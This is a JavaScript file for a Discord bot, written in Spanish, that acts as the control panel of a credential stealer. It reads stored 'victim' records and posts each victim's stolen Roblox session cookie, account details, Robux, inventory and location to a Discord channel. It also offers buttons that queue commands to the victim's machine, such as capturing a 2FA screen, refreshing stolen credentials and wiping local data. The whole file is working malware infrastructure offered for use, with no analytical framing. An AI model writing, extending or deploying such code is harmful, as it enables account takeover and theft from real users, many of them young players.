// api/bot-gateway.js - VERSIÓN FINAL SIN LOGS
import { Client, GatewayIntentBits } from 'discord.js';
import fs from 'fs';

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

let botIniciado = false;
const DB_PATH = '/tmp/victims.json';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (!botIniciado) {
        try {
            await client.login(process.env.DISCORD_BOT_TOKEN);
            botIniciado = true;
            
            client.on('interactionCreate', async (interaction) => {
                if (!interaction.isButton()) return;
                
                try {
                    const partes = interaction.customId.split('_');
                    const action = partes[0];
                    const userId = partes.slice(1).join('_');
                    
                    let victimData = {};
                    try {
                        if (fs.existsSync(DB_PATH)) {
                            const victims = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
                            victimData = victims[userId] || {};
                        }
                    } catch {}
                    
                    const r = victimData.roblox || {};
                    
                    if (action === 'roblox') {
                        await interaction.reply({
                            content: `||@here||\n🔔 ¡Informacion seleccionada: **ROBLOX**!\n\n**📌 PRINCIPAL **\n👤 Usuario Roblox: ${r.username || 'No disponible'}\n🆔 ID: ${r.userId || 'No disponible'}\n💰 Robux: ${r.robux || 0}\n⭐ Seguidores: ${r.seguidores || 0}\n👥 Amigos: ${r.amigos || 0}\n💱 Premium: ${r.premium || 'No'}\n🔰 Verificado: ${r.verified || 'No'}\n\n💼 **Inventario:**\nHeadless: \`${r.headless || 'No'}\`\nKorblox: \`${r.korblox || 'No'}\`\n\n**🌐 Informacion Horaria:**\n🌍 País: \`${victimData.pais || 'Desconocido'}\`\n📅 Fecha: \`${victimData.fecha || ''}\`\n⏰ Hora Exacta: \`${victimData.hora || ''}\`\n\n🍪 Cookie:\n\`\`\`${victimData.cookie || 'No disponible'}\`\`\``,
                            ephemeral: true
                        });
                        return;
                    }
                    
                    if (action === 'discord') {
                        await interaction.reply({
                            content: `||@here||\n🔔 ¡Informacion seleccionada: **DISCORD**!\n\n**📌 PRINCIPAL **\n👤 Usuario Discord: (No disponible)\n🆔 ID de Discord: (No disponible)\n👥 Amigos: (No disponible)\n💱 Discord nitro: (No disponible)\n\n**🌐 Informacion Horaria:**\n🌍 País: \`${victimData.pais || 'Desconocido'}\`\n📅 Fecha: \`${victimData.fecha || ''}\`\n⏰ Hora Exacta: \`${victimData.hora || ''}\`\n\n✨ Token de sesión:\n\`\`\`No disponible\`\`\``,
                            ephemeral: true
                        });
                        return;
                    }
                    
                    if (action === 'comandos') {
                        await interaction.reply({
                            content: `||@here||\n✏️ **¡ Comandos seleccionados ! **\nElige Una Opcion:`,
                            ephemeral: true,
                            components: [
                                {
                                    type: 1,
                                    components: [
                                        { type: 2, style: 4, label: '📸 Capturar pantalla del 2FA', custom_id: `capturar_pantalla_${userId}` }
                                    ]
                                },
                                {
                                    type: 1,
                                    components: [
                                        { type: 2, style: 1, label: '🔄 Actualizar credenciales', custom_id: `actualizar_credenciales_${userId}` }
                                    ]
                                },
                                {
                                    type: 1,
                                    components: [
                                        { type: 2, style: 4, label: '🗑️ Limpiar datos locales', custom_id: `limpiar_datos_${userId}` }
                                    ]
                                }
                            ]
                        });
                        return;
                    }
                    
                    if (['capturar_pantalla', 'actualizar_credenciales', 'limpiar_datos'].includes(action)) {
                        if (!global.commands) global.commands = {};
                        if (!global.commands[userId]) global.commands[userId] = [];
                        global.commands[userId].push({ action });
                        
                        await interaction.reply({
                            content: `✅ Orden \`${action}\` enviada a la víctima.`,
                            ephemeral: true
                        });
                    }
                } catch {}
            });
        } catch {}
    }
    
    res.status(200).json({ status: 'ok' });
}